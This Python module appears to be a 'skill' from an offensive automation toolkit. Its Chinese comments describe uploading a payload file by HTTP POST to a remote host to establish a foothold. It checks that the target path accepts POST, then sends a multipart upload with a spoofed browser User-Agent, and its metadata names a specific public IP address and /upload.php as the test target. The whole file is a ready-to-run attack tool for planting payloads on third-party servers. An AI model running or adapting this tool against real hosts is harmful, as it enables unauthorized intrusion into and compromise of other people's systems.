"""skill/deploy_remote_http.py - 通过HTTP POST上传payload文件到远程主机，建立据点

SKILL_META:
{
  "name": "deploy_remote_http",
  "description": "通过HTTP POST上传payload文件到远程主机，建立据点",
  "category": "deploy",
  "test_target": "209.51.188.20:80 HTTP服务器",
  "test_args": "--host 209.51.188.20 --port 80 --path /upload.php --payload_file my_payload.py",
  "version": "1.0"
}
"""
from __future__ import annotations

import argparse
import json
import mimetypes
import sys
from typing import Any
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

def check_http_methods(host: str, port: int, path: str) -> dict[str, Any]:
    """检查HTTP方法是否支持POST"""
    try:
        from check_http_methods import main as check_http_methods_run
        return check_http_methods_run(host=host, port=port, path=path)
    except ImportError:
        return {"success": False, "message": "check_http_methods工具不可用"}

def upload_file(
    host: str, 
    port: int, 
    path: str, 
    payload_file: str,
    field_name: str = "file"
) -> dict[str, Any]:
    """通过HTTP POST上传文件"""
    try:
        with open(payload_file, 'rb') as f:
            file_content = f.read()
    except FileNotFoundError as e:
        return {"success": False, "message": f"文件未找到: {e}"}
    except PermissionError as e:
        return {"success": False, "message": f"文件权限错误: {e}"}
    except OSError as e:
        return {"success": False, "message": f"文件读取错误: {e}"}

    # 构建multipart/form-data
    boundary = "----WebKitFormBoundary" + "".join(str(i) for i in range(10))
    filename = payload_file.split('/')[-1]
    content_type, _ = mimetypes.guess_type(payload_file)
    if not content_type:
        content_type = 'application/octet-stream'

    # 构建请求体
    body_parts = [
        f'--{boundary}',
        f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"',
        f'Content-Type: {content_type}',
        '',
        file_content.decode('latin-1') if isinstance(file_content, bytes) else file_content,
        f'--{boundary}--',
        ''
    ]
    body = '\r\n'.join(body_parts).encode('latin-1')

    # 构建URL和请求
    scheme = "http"
    if port == 443:
        scheme = "https"
    url = f"{scheme}://{host}:{port}{path}"

    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    }

    try:
        request = Request(url, data=body, headers=headers, method='POST')
        with urlopen(request, timeout=30) as response:
            response_data = response.read().decode('utf-8', errors='ignore')
            status_code = response.getcode()

            return {
                "success": 200 <= status_code < 300,
                "message": f"HTTP {status_code}",
                "data": {
                    "status_code": status_code,
                    "response": response_data[:500],
                    "url": url,
                    "filename": filename
                }
            }
    except HTTPError as e:
        return {
            "success": False,
            "message": f"HTTP错误: {e.code} {e.reason}",
            "data": {"status_code": e.code}
        }
    except URLError as e:
        return {"success": False, "message": f"URL错误: {e.reason}"}
    except TimeoutError as e:
        return {"success": False, "message": f"请求超时: {e}"}
    except Exception as e:
        return {"success": False, "message": f"上传错误: {e}"}

def main(
    host: str,
    port: int = 80,
    path: str = "/upload",
    payload_file: str = "payload.py"
) -> dict[str, Any]:
    """通过HTTP POST上传payload文件到远程主机，建立据点"""
    results: dict[str, Any] = {"success": False, "message": "", "data": {}}

    try:
        # 检查HTTP方法
        check_result = check_http_methods(host, port, path)
        if not check_result.get("success", False):
            results["message"] = f"HTTP方法检查失败: {check_result.get('message', '未知错误')}"
            return results

        methods = check_result.get("data", {}).get("methods", [])
        if "POST" not in methods:
            results["message"] = f"目标路径不支持POST方法，可用方法: {methods}"
            return results

        # 上传文件
        upload_result = upload_file(host, port, path, payload_file)

        if upload_result["success"]:
            results["success"] = True
            results["message"] = f"上传成功: {upload_result['message']}"
        else:
            results["message"] = f"上传失败: {upload_result['message']}"

        results["data"] = upload_result.get("data", {})

    except FileNotFoundError as e:
        results["message"] = f"文件未找到错误: {e}"
    except PermissionError as e:
        results["message"] = f"权限错误: {e}"
    except ValueError as e:
        results["message"] = f"参数错误: {e}"
    except Exception as e:
        results["message"] = f"未知错误: {e}"

    return results

if __name__ == "__main__":
    # 直接解析命令行参数，不通过argparse
    args_dict = {}
    current_arg = None

    for i in range(1, len(sys.argv)):
        arg = sys.argv[i]
        if arg.startswith("--"):
            current_arg = arg[2:]
            args_dict[current_arg] = None
        elif current_arg:
            args_dict[current_arg] = arg
            current_arg = None

    # 检查必需参数
    required_args = ["host", "path", "payload_file"]
    missing_args = [arg for arg in required_args if arg not in args_dict or args_dict[arg] is None]

    if missing_args:
        print(json.dumps({
            "success": False,
            "message": f"缺少必需参数: {', '.join(f'--{arg}' for arg in missing_args)}",
            "data": {}
        }, ensure_ascii=False, indent=2))
        sys.exit(1)

    # 获取参数值
    host = args_dict["host"]
    path = args_dict["path"]
    payload_file = args_dict["payload_file"]
    port = int(args_dict.get("port", "80"))

    # 调用main函数
    result = main(
        host=host,
        port=port,
        path=path,
        payload_file=payload_file
    )
    print(json.dumps(result, ensure_ascii=False, indent=2))